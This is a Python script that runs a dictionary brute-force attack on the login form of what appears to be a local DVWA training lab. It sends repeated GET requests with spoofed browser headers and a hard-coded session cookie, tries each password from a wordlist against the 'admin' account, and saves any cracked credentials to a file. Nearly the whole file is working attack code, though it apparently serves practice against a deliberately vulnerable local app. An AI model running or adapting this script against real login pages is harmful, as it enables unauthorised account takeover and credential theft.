import requests
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Target URL
url = "http://localhost:4280/vulnerabilities/brute/"

# Headers to mimic a real browser request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "http://localhost:4280/vulnerabilities/brute/",
    "Cookie": "csrftoken=JVPHuff7L4DcaWmrc2WJvPLgKirKBulT; language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=f131b6432653bbc6694fad8ed101b7ff; security=low"
}


# Function to perform brute force attack
def brute_force(username, password_file):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    i = 1
    for password in passwords:
        # Parameters for the GET request
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        # Send the GET request
        response = requests.get(url, headers=headers, params=params)

        # Check if login was successful
        if "Welcome to the password protected area" in response.text:
            msg = f"[{i}][+] Success! Username: {username}, Password: {password}"
            logging.info(msg)
            with open("result.txt", 'w') as file:
                file.write(msg)
            return

        logging.info(f"[{i}][-] Failed: {username}:{password}")
        i += 1

    logging.info("[!] Brute force attack completed. No valid credentials found.")


if __name__ == "__main__":
    username = "admin"
    password_file = "source/dictionary/pwd_121_rnd.txt"

    brute_force(username, password_file)
